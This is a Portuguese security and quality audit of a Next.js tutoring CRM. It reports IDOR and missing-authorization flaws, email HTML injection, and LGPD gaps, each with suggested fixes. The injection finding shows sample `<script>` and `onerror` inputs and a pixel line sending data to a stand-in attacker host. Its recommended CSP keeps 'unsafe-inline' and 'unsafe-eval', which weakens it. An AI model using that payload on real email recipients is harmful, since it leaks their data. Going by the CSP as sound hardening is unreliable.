# Relatório de Auditoria — CRM Lição de Casa
Data: 15/05/2026

## Resumo Executivo
- Total de itens analisados: 58
- Itens 🔴 Críticos: 7
- Itens 🟡 Importantes: 12
- Itens 🟢 Melhorias: 10
- Nota geral do projeto: 6.2/10

O projeto tem uma base sólida e bem estruturada — stack moderna, código limpo, identidade visual consistente e boas práticas em muitas áreas. As principais preocupações estão na **camada de autorização das Server Actions**, onde diversas funções sensíveis aceitam parâmetros externos sem verificar se o usuário logado tem permissão para aquela operação específica. Isso abre brechas sérias de IDOR e privilege escalation. A ausência total de conformidade com a LGPD também é urgente dado que o sistema lida com dados de menores de idade.

---

## Pontos Fortes ✅

- **bcrypt com cost 12** em todas as operações de hash de senha — acima do mínimo recomendado.
- **Zod validando inputs** no cliente e no servidor nas principais ações.
- **Transações Prisma** usadas corretamente em operações multi-write (criar aula + debitar pacote).
- **Layouts com verificação de role** — cada grupo de rotas valida a role antes de renderizar.
- **Server Components** usados na grande maioria das páginas, minimizando JavaScript no client.
- **Fallback gracioso** nas integrações externas (email/WhatsApp falham silenciosamente sem derrubar o fluxo).
- **CRON protegido por Bearer token** nos endpoints `/api/cron/*`.
- **`.gitignore` excluindo `.env*`** — credenciais fora do repositório.
- **Soft delete via `active: Boolean`** em usuários — histórico preservado.
- **Identidade visual consistente** — cores, fontes e componentes alinhados ao brandbook.
- **Formatação pt-BR** em datas e valores monetários em todo o sistema.
- **Estados vazios e de loading** bem tratados na maioria dos componentes.

---

## Problemas Encontrados

### 🔴 CRÍTICOS

---

#### 1. Server Action `saveAvailabilityAction` sem autenticação
- **Arquivo:** [src/app/(professor)/professor/disponibilidade/actions.ts](src/app/(professor)/professor/disponibilidade/actions.ts) (linhas 1–13)
- **Problema:** A action aceita `teacherId` como parâmetro mas não verifica a sessão nem se o usuário logado é realmente aquele professor. Qualquer usuário autenticado pode chamar essa função com o ID de qualquer professor e sobrescrever sua disponibilidade.
- **Impacto:** Um aluno ou professor mal-intencionado pode bloquear a agenda de qualquer professor, impedindo novos agendamentos.
- **Solução sugerida:**
  ```typescript
  "use server"
  import { prisma }        from "@/lib/prisma"
  import { auth }          from "@/lib/auth"
  import { revalidatePath } from "next/cache"
  import type { Availability } from "@/lib/availability"

  export async function saveAvailabilityAction(availability: Availability) {
    const session = await auth()
    if (!session?.user) throw new Error("Sem permissão")

    const teacher = await prisma.teacher.findFirst({
      where: { user: { email: session.user.email ?? "" } },
    })
    if (!teacher) throw new Error("Perfil de professor não encontrado")

    await prisma.teacher.update({
      where: { id: teacher.id },
      data:  { availability: availability as object },
    })
    revalidatePath("/professor/disponibilidade")
  }
  ```
  E no form, remover o `teacherId` do componente e chamada: `await saveAvailabilityAction(avail)`.
- **Esforço estimado:** Baixo

---

#### 2. Server Action `togglePackageAction` sem autenticação/autorização
- **Arquivo:** [src/app/(admin)/admin/financeiro/pacotes/actions.ts](src/app/(admin)/admin/financeiro/pacotes/actions.ts) (linhas 1–12)
- **Problema:** Nenhuma verificação de sessão ou role. Qualquer pessoa (mesmo não autenticada via chamada direta) pode ativar ou desativar pacotes de aula de qualquer aluno.
- **Impacto:** Aluno pode ativar pacotes expirados ou desativar pacotes de outros alunos.
- **Solução sugerida:**
  ```typescript
  "use server"
  import { prisma }        from "@/lib/prisma"
  import { auth }          from "@/lib/auth"
  import { revalidatePath } from "next/cache"

  async function requireAdmin() {
    const session = await auth()
    if (session?.user?.role !== "ADMIN") throw new Error("Sem permissão")
  }

  export async function togglePackageAction(id: string, active: boolean) {
    await requireAdmin()
    await prisma.lessonPackage.update({
      where: { id },
      data:  { status: active ? "ACTIVE" : "EXPIRED" },
    })
    revalidatePath("/admin/financeiro/pacotes")
  }
  ```
- **Esforço estimado:** Baixo

---

#### 3. `approveRequestAction` e `rejectRequestAction` sem verificação de role (privilege escalation)
- **Arquivo:** [src/lib/actions/lesson-request.ts](src/lib/actions/lesson-request.ts) (linhas 10–12, 81–84)
- **Problema:** Ambas as funções verificam apenas `if (!session?.user)` mas não verificam se o usuário tem role `ADMIN` ou `COLLABORATOR`. Um `STUDENT` pode chamar `approveRequestAction` diretamente e aprovar sua própria solicitação de aula, debitando o pacote e criando uma aula confirmada sem passar pelo fluxo correto.
- **Impacto:** Aluno pode aprovar suas próprias solicitações e potencialmente manipular o saldo do pacote.
- **Solução sugerida:**
  ```typescript
  export async function approveRequestAction(requestId: string) {
    const session = await auth()
    if (!session?.user) throw new Error("Sem permissão")
    if (!["ADMIN", "COLLABORATOR"].includes(session.user.role)) {
      throw new Error("Sem permissão")
    }
    // ... resto da função
  }

  export async function rejectRequestAction(requestId: string, reason?: string) {
    const session = await auth()
    if (!session?.user) throw new Error("Sem permissão")
    if (!["ADMIN", "COLLABORATOR"].includes(session.user.role)) {
      throw new Error("Sem permissão")
    }
    // ... resto da função
  }
  ```
- **Esforço estimado:** Baixo

---

#### 4. `updateLessonStatusAction` sem verificação de pertença (IDOR)
- **Arquivo:** [src/lib/actions/lesson-request.ts](src/lib/actions/lesson-request.ts) (linhas 112–120)
- **Problema:** A função verifica se o usuário está logado mas não verifica se a aula (`lessonId`) pertence ao professor logado. Um professor pode alterar o status de aulas de outros professores informando qualquer `lessonId`.
- **Impacto:** Professor pode marcar aulas de colegas como "Concluída" ou "Cancelada", afetando o cálculo de repasses e o histórico de outros professores.
- **Solução sugerida:**
  ```typescript
  export async function updateLessonStatusAction(
    lessonId:      string,
    status:        "COMPLETED" | "CANCELLED" | "MISSED",
    topicsCovered?: string,
    teacherNotes?:  string,
  ) {
    const session = await auth()
    if (!session?.user) throw new Error("Sem permissão")

    const lesson = await prisma.lesson.findUnique({
      where:   { id: lessonId },
      include: {
        student: { include: { user: true } },
        teacher: { include: { user: true } },
        subject: true,
      },
    })
    if (!lesson) throw new Error("Aula não encontrada")

    // Verifica se o professor logado é dono da aula (ADMIN pode alterar qualquer uma)
    if (session.user.role === "TEACHER") {
      const teacher = await prisma.teacher.findFirst({
        where: { user: { email: session.user.email ?? "" } },
      })
      if (!teacher || lesson.teacherId !== teacher.id) {
        throw new Error("Sem permissão para alterar esta aula")
      }
    } else if (!["ADMIN", "COLLABORATOR"].includes(session.user.role)) {
      throw new Error("Sem permissão")
    }

    // ... resto da função
  }
  ```
- **Esforço estimado:** Baixo

---

#### 5. Endpoint de slots do professor completamente público (sem autenticação)
- **Arquivo:** [src/app/api/teachers/[id]/slots/route.ts](src/app/api/teachers/[id]/slots/route.ts) (linhas 1–45)
- **Problema:** O endpoint `/api/teachers/[id]/slots` não exige autenticação. Qualquer pessoa na internet pode consultar a disponibilidade e as aulas marcadas de qualquer professor, incluindo os horários com aulas já agendadas.
- **Impacto:** Exposição de dados de agenda (horários de aulas, quantidade de aulas marcadas) de professores para pessoas não autorizadas. Risco de OSINT/stalking.
- **Solução sugerida:**
  ```typescript
  export async function GET(req: NextRequest, { params }: { params: Promise<{ id: string }> }) {
    const session = await auth()
    if (!session?.user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }
    // ... resto da função
  }
  ```
- **Esforço estimado:** Baixo

---

#### 6. Injeção de HTML no template de e-mail (XSS em emails)
- **Arquivo:** [src/lib/notifications/email.ts](src/lib/notifications/email.ts) (linhas 7–41)
- **Problema:** A função `buildEmailHtml` interpola `title`, `message` e os valores de `data` diretamente no HTML sem escaping. Se qualquer campo de notificação contiver HTML (ex: um nome de aluno com `<script>` ou `<img onerror=...>`), o email será renderizado com esse HTML.
- **Impacto:** Embora emails modernos bloqueiem JavaScript, ainda é possível exfiltrar dados via pixel tracking (`<img src="atacante.com?data=...">`). Também pode causar quebra visual dos emails.
- **Solução sugerida:**
  ```typescript
  function escapeHtml(str: string): string {
    return str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;")
  }

  function buildEmailHtml(title: string, message: string, data?: Record<string, string>) {
    const safeTitle   = escapeHtml(title)
    const safeMessage = escapeHtml(message)
    // ... usar safeTitle e safeMessage no template
    // E nos dados: escapeHtml(k) e escapeHtml(v)
  }
  ```
- **Esforço estimado:** Baixo

---

#### 7. `CRON_SECRET` ausente do `.env.example` — endpoints de cron desprotegidos se não configurado
- **Arquivo:** [.env.example](.env.example) + [src/app/api/cron/reminders/route.ts](src/app/api/cron/reminders/route.ts) (linha 8)
- **Problema:** A variável `CRON_SECRET` não consta no `.env.example`. Se um desenvolvedor subir o projeto sem essa variável, a condição `process.env.CRON_SECRET` retorna `undefined`, e a comparação `authorization !== "Bearer undefined"` ainda pode ser satisfeita com um request especificamente construído. Além disso, sem documentação, o secret pode não ser configurado.
- **Impacto:** Qualquer pessoa pode triggerar os jobs de cron manualmente, causando spam de notificações e atualizações indevidas de status de pagamento.
- **Solução sugerida:**
  1. Adicionar ao `.env.example`:
     ```
     # ─── Cron Jobs ───────────────────────────────────────────────────────────────
     CRON_SECRET="gere-com-openssl-rand-base64-32"
     ```
  2. Adicionar validação explícita nos handlers:
     ```typescript
     const secret = process.env.CRON_SECRET
     if (!secret || request.headers.get("authorization") !== `Bearer ${secret}`) {
       return Response.json({ error: "Unauthorized" }, { status: 401 })
     }
     ```
- **Esforço estimado:** Baixo

---

### 🟡 IMPORTANTES

---

#### 1. Ausência de rate limiting no login — vulnerável a força bruta
- **Arquivo:** [src/app/(auth)/login/actions.ts](src/app/(auth)/login/actions.ts)
- **Problema:** Nenhum controle de tentativas de login por IP ou por email. Um atacante pode testar milhares de senhas sem limitação.
- **Impacto:** Contas de alunos (incluindo menores) podem ser comprometidas por força bruta.
- **Solução sugerida:** Usar Upstash Rate Limit (funciona no Edge do Vercel) ou implementar bloqueio temporário via Redis/Supabase após 5 tentativas:
  ```typescript
  // npm install @upstash/ratelimit @upstash/redis
  import { Ratelimit } from "@upstash/ratelimit"
  import { Redis }     from "@upstash/redis"

  const ratelimit = new Ratelimit({
    redis:     Redis.fromEnv(),
    limiter:   Ratelimit.slidingWindow(5, "15 m"),
    analytics: true,
  })

  export async function loginAction(formData: FormData) {
    const ip = headers().get("x-forwarded-for") ?? "unknown"
    const { success } = await ratelimit.limit(ip)
    if (!success) redirect("/login?error=too-many-attempts")
    // ... resto da função
  }
  ```
- **Esforço estimado:** Médio

---

#### 2. Senha mínima de apenas 6 caracteres
- **Arquivo:** [src/lib/validations/auth.ts](src/lib/validations/auth.ts) (linha 6) e [src/lib/validations/user.ts](src/lib/validations/user.ts) (linha 7)
- **Problema:** Mínimo de 6 caracteres aceita senhas triviais como `123456` ou `abc123`.
- **Impacto:** Senhas fracas aumentam drasticamente o risco de comprometimento de contas de menores.
- **Solução sugerida:**
  ```typescript
  password: z.string()
    .min(8, "Senha deve ter no mínimo 8 caracteres")
    .regex(/[A-Z]/, "Deve conter ao menos uma letra maiúscula")
    .regex(/[0-9]/, "Deve conter ao menos um número"),
  ```
- **Esforço estimado:** Baixo (requer comunicação com usuários existentes)

---

#### 3. Ausência de security headers no `next.config.ts`
- **Arquivo:** [next.config.ts](next.config.ts)
- **Problema:** O arquivo está vazio. Nenhum header de segurança configurado: sem CSP, sem HSTS, sem X-Frame-Options, sem X-Content-Type-Options.
- **Impacto:** O sistema está vulnerável a clickjacking (sem X-Frame-Options), MIME-sniffing e ataques de injeção via iframes.
- **Solução sugerida:**
  ```typescript
  const securityHeaders = [
    { key: "X-DNS-Prefetch-Control",  value: "on" },
    { key: "X-Frame-Options",         value: "SAMEORIGIN" },
    { key: "X-Content-Type-Options",  value: "nosniff" },
    { key: "Referrer-Policy",         value: "strict-origin-when-cross-origin" },
    { key: "Permissions-Policy",      value: "camera=(), microphone=(), geolocation=()" },
    {
      key: "Strict-Transport-Security",
      value: "max-age=63072000; includeSubDomains; preload",
    },
    {
      key: "Content-Security-Policy",
      value: [
        "default-src 'self'",
        "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        "font-src 'self' https://fonts.gstatic.com",
        "img-src 'self' data: blob:",
        "connect-src 'self' https://api.z-api.io https://*.supabase.co",
      ].join("; "),
    },
  ]

  const nextConfig: NextConfig = {
    async headers() {
      return [{ source: "/(.*)", headers: securityHeaders }]
    },
  }
  ```
- **Esforço estimado:** Baixo

---

#### 4. Cancelamento de aula NÃO devolve saldo ao aluno (regra de negócio ausente)
- **Arquivo:** [src/lib/actions/lesson-request.ts](src/lib/actions/lesson-request.ts) (linhas 112–166)
- **Problema:** `updateLessonStatusAction` atualiza o status para `CANCELLED` mas não devolve a aula ao saldo do pacote do aluno. A regra de negócio estabelece que cancelamento pelo professor/colaborador deve devolver o saldo.
- **Impacto:** Aluno perde aulas do pacote injustamente quando o professor cancela.
- **Solução sugerida:** Adicionar lógica de estorno dentro da transação:
  ```typescript
  if (status === "CANCELLED") {
    // Encontra o pacote ativo do aluno para devolver a aula
    const activePkg = await prisma.lessonPackage.findFirst({
      where: { studentId: lesson.studentId, status: { in: ["ACTIVE", "EXHAUSTED"] } },
      orderBy: { purchaseDate: "desc" },
    })
    if (activePkg) {
      await prisma.lessonPackage.update({
        where: { id: activePkg.id },
        data:  {
          remainingLessons: { increment: 1 },
          status: "ACTIVE",  // reativa se estava EXHAUSTED
        },
      })
    }
  }
  ```
- **Esforço estimado:** Baixo

---

#### 5. Índices ausentes no schema Prisma — queries lentas em produção
- **Arquivo:** [prisma/schema.prisma](prisma/schema.prisma)
- **Problema:** Campos consultados com frequência não têm índices declarados.
- **Impacto:** À medida que o sistema crescer (centenas de aulas, alunos), as queries de agenda, dashboard e relatórios ficarão progressivamente mais lentas.
- **Solução sugerida:** Adicionar ao schema:
  ```prisma
  model Lesson {
    // ... campos existentes
    @@index([studentId])
    @@index([teacherId])
    @@index([status])
    @@index([scheduledAt])
    @@index([teacherId, status, scheduledAt])  // índice composto para dashboard do professor
  }

  model LessonRequest {
    // ... campos existentes
    @@index([teacherId, status])
    @@index([studentId, status])
  }

  model Payment {
    // ... campos existentes
    @@index([studentId])
    @@index([status])
    @@index([dueDate])
  }

  model Notification {
    // ... campos existentes
    @@index([userId, read])
    @@index([createdAt])
  }

  model ActivityLog {
    // ... campos existentes
    @@index([userId])
    @@index([entityType, entityId])
  }
  ```
- **Esforço estimado:** Baixo (apenas rodar `npx prisma migrate dev`)

---

#### 6. Página de relatórios carrega TODOS os dados sem paginação (risco de OOM)
- **Arquivo:** [src/app/(admin)/admin/relatorios/page.tsx](src/app/(admin)/admin/relatorios/page.tsx) (linhas 23–33)
- **Problema:** A função `getReportData()` faz `findMany` sem `take` em todas as entidades principais: todas as aulas, todos os pagamentos, todos os alunos (com suas aulas), todos os professores (com suas aulas), todas as matérias (com suas aulas). Em produção com 1000+ registros, isso pode causar timeout e uso excessivo de memória.
- **Impacto:** Página de relatórios pode travar ou crashar o servidor em produção.
- **Solução sugerida:** Usar queries agregadas em vez de buscar todos os registros:
  ```typescript
  // Em vez de buscar todos os lessons e filtrar em JS:
  const aulasRealizadas = await prisma.lesson.count({ where: { status: "COMPLETED" } })
  
  // E para gráficos por mês, usar groupBy ou queries específicas por período
  const aulasMeses = await Promise.all(
    months.map(({ start, end, label }) =>
      prisma.lesson.count({ where: { scheduledAt: { gte: start, lte: end } } })
        .then((value) => ({ label, value }))
    )
  )
  ```
- **Esforço estimado:** Médio

---

#### 7. JWT sem expiração explícita — sessões válidas por 30 dias
- **Arquivo:** [src/lib/auth.config.ts](src/lib/auth.config.ts) (linhas 14–27)
- **Problema:** O Auth.js usa `maxAge` de 30 dias por padrão quando não configurado. Para um sistema com dados de menores de idade, sessões tão longas são inadequadas.
- **Impacto:** Dispositivo compartilhado ou roubado mantém acesso por até 30 dias sem reautenticação.
- **Solução sugerida:**
  ```typescript
  export const authConfig: NextAuthConfig = {
    session: {
      strategy: "jwt",
      maxAge:   8 * 60 * 60,  // 8 horas (um dia letivo)
    },
    // ...
  }
  ```
- **Esforço estimado:** Baixo

---

#### 8. Agendamento não verifica disponibilidade real no backend
- **Arquivo:** [src/app/(aluno)/aluno/agendar/actions.ts](src/app/(aluno)/aluno/agendar/actions.ts) (linhas 12–65)
- **Problema:** A action `requestLessonAction` não verifica se o horário solicitado (`preferredAt`) está dentro da disponibilidade do professor nem se já existe outra aula marcada naquele horário. O cliente controla os slots exibidos, mas o backend não valida.
- **Impacto:** Um usuário mal-intencionado pode enviar um `preferredAt` arbitrário e criar solicitações para horários bloqueados ou fora da disponibilidade.
- **Solução sugerida:**
  ```typescript
  import { isWithinAvailability, hasConflict } from "@/lib/availability"

  // Após buscar o professor:
  const teacher = await prisma.teacher.findUnique({
    where: { id: teacherId },
    include: { lessons: { where: { status: { in: ["SCHEDULED","CONFIRMED"] } } } }
  })

  const availability = (teacher.availability ?? {}) as Availability
  const requestDate  = new Date(preferredAt)

  if (!isWithinAvailability(requestDate, availability)) {
    redirect("/aluno/agendar?error=Horário+fora+da+disponibilidade+do+professor")
  }
  if (hasConflict(requestDate, teacher.lessons.map((l) => l.scheduledAt))) {
    redirect("/aluno/agendar?error=Horário+já+ocupado")
  }
  ```
- **Esforço estimado:** Baixo

---

#### 9. Conformidade LGPD completamente ausente
- **Problema:** O sistema processa dados de menores de idade sem nenhuma das proteções exigidas pela LGPD.
- **Impacto:** Risco legal significativo — a ANPD pode aplicar multas de até 2% do faturamento (máx R$ 50 milhões) e exigir suspensão do serviço. Dado que o sistema trata dados de crianças e adolescentes, a responsabilidade é ainda maior.
- **Itens ausentes:**
  - Nenhum termo de consentimento no cadastro
  - Nenhuma política de privacidade acessível
  - Nenhum mecanismo de exportação de dados (`/aluno/meus-dados`)
  - Nenhuma opção de solicitação de exclusão de conta
  - Nenhum campo de consentimento para envio de email/WhatsApp
  - Sem distinção entre titular dos dados (aluno) e responsável legal (guardian)
- **Esforço estimado:** Alto (mas não pode ser deixado para depois)

---

#### 10. Aulas em grupo: schema existe mas lógica não implementada
- **Arquivo:** [prisma/schema.prisma](prisma/schema.prisma) (linhas 194–195)
- **Problema:** O modelo `Lesson` tem `isGroupLesson: Boolean` e `groupId: String?` mas não existe modelo `LessonGroup` nem lógica para debitar o saldo de todos os alunos do grupo.
- **Impacto:** Se aulas em grupo forem criadas manualmente, apenas o aluno titular do `studentId` terá o saldo debitado, não os demais.
- **Solução sugerida:** Criar modelo `LessonGroup` com relação M:M para `Student`, e na aprovação do agendamento de grupo, iterar sobre todos os alunos participantes para debitar o saldo de cada um.
- **Esforço estimado:** Alto

---

#### 11. `rejectRequestAction` executa update mesmo se o request não for encontrado
- **Arquivo:** [src/lib/actions/lesson-request.ts](src/lib/actions/lesson-request.ts) (linhas 86–110)
- **Problema:** O `prisma.lessonRequest.update` na linha 90 é executado independentemente de `request` ser `null`. O Prisma lançará exceção não tratada se o ID não existir.
- **Impacto:** Exceção não tratada pode vazar stack trace para o cliente.
- **Solução sugerida:**
  ```typescript
  const request = await prisma.lessonRequest.findUnique({ ... })
  if (!request) throw new Error("Solicitação não encontrada")
  // ... resto da função
  ```
- **Esforço estimado:** Baixo

---

#### 12. Middleware não faz redirecionamento baseado em role — usuário acessa rota errada e vê erro genérico
- **Arquivo:** [src/middleware.ts](src/middleware.ts) (linhas 7–25)
- **Problema:** O middleware redireciona para `/login` se não autenticado, mas se um usuário autenticado tenta acessar `/admin/dashboard` sendo professor, o layout redireciona para `/login` em vez de `/professor/dashboard`. Confuso para o usuário.
- **Solução sugerida:**
  ```typescript
  export default auth((req) => {
    const { pathname } = req.nextUrl
    const isLoggedIn   = !!req.auth
    const isAuthPage   = pathname.startsWith("/login")

    if (!isLoggedIn && !isAuthPage) {
      return NextResponse.redirect(new URL("/login", req.url))
    }

    if (isLoggedIn && isAuthPage) {
      const role = req.auth?.user?.role as string
      const home = ROLE_HOME[role] ?? "/login"
      return NextResponse.redirect(new URL(home, req.url))
    }

    // Redireciona para home do role se tentar acessar rota de outro perfil
    if (isLoggedIn) {
      const role = req.auth?.user?.role as string
      const home = ROLE_HOME[role]
      const isWrongArea =
        (pathname.startsWith("/admin") && role !== "ADMIN") ||
        (pathname.startsWith("/colaborador") && !["ADMIN","COLLABORATOR"].includes(role)) ||
        (pathname.startsWith("/professor") && !["ADMIN","TEACHER"].includes(role)) ||
        (pathname.startsWith("/aluno") && !["STUDENT","GUARDIAN"].includes(role))

      if (isWrongArea && home) {
        return NextResponse.redirect(new URL(home, req.url))
      }
    }

    const response = NextResponse.next()
    response.headers.set("x-pathname", pathname)
    return response
  })
  ```
- **Esforço estimado:** Baixo

---

### 🟢 MELHORIAS

---

#### 1. Ausência completa de testes automatizados
- **Problema:** Nenhum arquivo de teste encontrado em todo o projeto.
- **Prioridade sugerida de cobertura:**
  1. Server Actions críticas (`approveRequestAction`, `createUserAction`, `generatePayoutAction`)
  2. Utilitários (`availability.ts` — `getAvailableSlotsForDate`, `hasConflict`)
  3. Validações Zod
- **Esforço estimado:** Alto

---

#### 2. Ausência de Error Boundary — erros inesperados expõem stack trace
- **Problema:** Não existe `error.tsx` em nenhum route group. Um erro não tratado exibirá a página de erro padrão do Next.js, que em desenvolvimento exibe stack trace.
- **Solução sugerida:** Criar `src/app/error.tsx` e `src/app/(admin)/error.tsx` etc.:
  ```typescript
  "use client"
  export default function ErrorPage({ error, reset }: { error: Error; reset: () => void }) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen gap-4">
        <h2 className="font-heading text-2xl">Algo deu errado</h2>
        <p className="text-muted-foreground">Tente novamente ou entre em contato com o suporte.</p>
        <Button onClick={reset}>Tentar novamente</Button>
      </div>
    )
  }
  ```
- **Esforço estimado:** Baixo

---

#### 3. Ícones do PWA provavelmente ausentes no filesystem
- **Arquivo:** [public/manifest.json](public/manifest.json)
- **Problema:** O manifest referencia `/icons/icon-72x72.png` até `/icons/icon-512x512.png`, mas não há evidência desses arquivos no projeto.
- **Impacto:** PWA não será instalável sem os ícones corretos.
- **Solução sugerida:** Gerar os ícones com a ferramenta [PWA Asset Generator](https://github.com/elegantapp/pwa-asset-generator) e colocar em `public/icons/`.
- **Esforço estimado:** Baixo

---

#### 4. Shortcut do manifest PWA aponta apenas para `/admin/dashboard`
- **Arquivo:** [public/manifest.json](public/manifest.json) (linha 24)
- **Problema:** O shortcut de "Dashboard" leva para `/admin/dashboard`, que é inacessível para alunos e professores.
- **Solução sugerida:** Apontar para `/` (que redireciona baseado no role) ou remover os shortcuts.
- **Esforço estimado:** Baixo

---

#### 5. Template de email sem versão texto (text/plain)
- **Arquivo:** [src/lib/notifications/email.ts](src/lib/notifications/email.ts) (linhas 51–58)
- **Problema:** Apenas HTML, sem fallback `text`. Clientes de email que bloqueiam HTML ou leitores de tela não conseguirão ler as notificações.
- **Solução sugerida:**
  ```typescript
  await resend.emails.send({
    from:    ...,
    to:      payload.email,
    subject: ...,
    html:    buildEmailHtml(payload.title, payload.message, payload.data),
    text:    `${payload.title}\n\n${payload.message}`,
  })
  ```
- **Esforço estimado:** Baixo

---

#### 6. Logs sem estrutura — difícil de depurar em produção
- **Arquivo:** [src/lib/notifications/email.ts](src/lib/notifications/email.ts) (linha 57), [src/lib/notifications/whatsapp.ts](src/lib/notifications/whatsapp.ts) (linha 35)
- **Problema:** Apenas `console.error` sem contexto estruturado (userId, email, tipo de notificação).
- **Solução sugerida:**
  ```typescript
  console.error("[Email] Falha ao enviar", {
    to:    payload.email,
    type:  payload.type,
    error: err instanceof Error ? err.message : String(err),
  })
  ```
- **Esforço estimado:** Baixo

---

#### 7. Webhook do Mercado Pago não implementado
- **Arquivo:** `.env.example` referencia `MERCADOPAGO_WEBHOOK_SECRET` mas não existe rota de webhook
- **Problema:** O sistema não processa callbacks de pagamento do Mercado Pago. Status de pagamentos precisam ser atualizados manualmente.
- **Solução sugerida:** Criar `src/app/api/webhooks/mercadopago/route.ts` com validação de assinatura HMAC e processamento de eventos `payment.approved`, `payment.rejected`, `payment.refunded`.
- **Esforço estimado:** Alto

---

#### 8. Avaliação de aula sem validação de status no backend
- **Problema:** O campo `studentRating` existe no schema mas não há Server Action ou validação que impeça um aluno de avaliar uma aula com status diferente de `COMPLETED`.
- **Solução sugerida:** Quando implementar a avaliação, verificar `if (lesson.status !== "COMPLETED") throw new Error("Só é possível avaliar aulas concluídas")`.
- **Esforço estimado:** Baixo (depende de implementar a feature de avaliação)

---

#### 9. Expiração automática de pacotes não validada ao agendar
- **Arquivo:** [src/app/(aluno)/aluno/agendar/actions.ts](src/app/(aluno)/aluno/agendar/actions.ts) (linha 27)
- **Problema:** A query busca pacotes com `status: "ACTIVE"` mas não filtra por `expiresAt > now`. Um pacote vencido (mas ainda marcado como ACTIVE) pode ser usado.
- **Solução sugerida:**
  ```typescript
  packages: {
    where: {
      status: "ACTIVE",
      remainingLessons: { gt: 0 },
      OR: [{ expiresAt: null }, { expiresAt: { gt: new Date() } }],
    },
  },
  ```
- **Esforço estimado:** Baixo

---

#### 10. README sem instruções de setup
- **Problema:** Não existe `README.md` no projeto. Um novo desenvolvedor não saberá como configurar o ambiente.
- **Solução sugerida:** Criar README com: pré-requisitos, clone, configuração do `.env`, `npx prisma migrate dev && npx prisma db seed`, `npm run dev`.
- **Esforço estimado:** Baixo

---

## Plano de Ação Recomendado

### Semana 1 — Segurança Crítica (não pode esperar)
1. 🔴 **#1** — Adicionar auth em `saveAvailabilityAction`
2. 🔴 **#2** — Adicionar auth em `togglePackageAction`
3. 🔴 **#3** — Adicionar verificação de role em `approveRequestAction`/`rejectRequestAction`
4. 🔴 **#4** — Adicionar verificação de pertença em `updateLessonStatusAction`
5. 🔴 **#5** — Adicionar auth no endpoint de slots do professor
6. 🔴 **#6** — Adicionar escape HTML no template de email
7. 🔴 **#7** — Adicionar `CRON_SECRET` ao `.env.example` e reforçar validação

### Semana 2 — Regras de Negócio e Performance
8. 🟡 **#4** — Devolver saldo ao cancelar aula
9. 🟡 **#8** — Validar disponibilidade e conflito no backend ao agendar
10. 🟡 **#9** — Corrigir expiração de pacotes no agendamento (item melhoria #9)
11. 🟡 **#6** — Refatorar página de relatórios para usar queries agregadas
12. 🟡 **#11** — Corrigir `rejectRequestAction` para verificar null

### Semana 3 — Hardening de Segurança
13. 🟡 **#1** — Implementar rate limiting no login
14. 🟡 **#3** — Adicionar security headers no `next.config.ts`
15. 🟡 **#7** — Reduzir `maxAge` da sessão JWT para 8 horas
16. 🟡 **#2** — Aumentar requisitos mínimos de senha para 8 caracteres
17. 🟡 **#12** — Melhorar middleware para redirecionar baseado em role
18. 🟡 **#5** — Adicionar índices no schema Prisma

### Semana 4 — LGPD e Qualidade
19. 🟡 **#9** — Iniciar implementação de conformidade LGPD (alta prioridade legal)
20. 🟢 **#2** — Criar error boundaries
21. 🟢 **#3 + #4** — Corrigir ícones e shortcut do PWA
22. 🟢 **#5** — Adicionar text/plain nos emails
23. 🟢 **#6** — Melhorar structured logging

### Backlog
24. 🟡 **#10** — Implementar lógica de aulas em grupo
25. 🟢 **#7** — Implementar webhook do Mercado Pago
26. 🟢 **#1** — Escrever testes para as Server Actions críticas
27. 🟢 **#10** — Criar README.md

---

## Pontuação por Categoria

| Categoria | Nota | Observação |
|-----------|------|------------|
| **Segurança** | 4.5/10 | Autenticação ok, autorização com lacunas críticas nas Server Actions |
| **RBAC (Controle de Acesso)** | 5.0/10 | Layouts protegidos, mas Server Actions sem verificação de role/ownership |
| **Banco de Dados** | 7.0/10 | Schema bem modelado, faltam índices e lógica de grupo |
| **Performance** | 6.5/10 | Server Components bem usados, relatórios sem paginação é risco sério |
| **UX/UI** | 8.5/10 | Excelente — identidade visual consistente, estados bem tratados, mobile ok |
| **Código e Arquitetura** | 8.0/10 | Código limpo, bem estruturado, TypeScript correto, sem `any` abusivo |
| **Regras de Negócio** | 6.0/10 | Agendamento e aprovação ok, cancelamento sem estorno, grupo não implementado |
| **Integrações Externas** | 5.5/10 | Email/WhatsApp com fallback, Mercado Pago sem webhook, rate limit ausente |
| **Conformidade LGPD** | 1.0/10 | Praticamente inexistente — risco legal imediato dado o público menor de idade |
| **PWA e Mobile** | 6.0/10 | Manifest configurado, ícones provavelmente ausentes, service worker não visto |
| **Deploy/DevOps** | 7.0/10 | `.env.example` quase completo, vercel.json com crons, falta README e healthcheck |

---

*Relatório gerado por análise estática completa do código-fonte. Não foram realizados testes de penetração dinâmicos.*
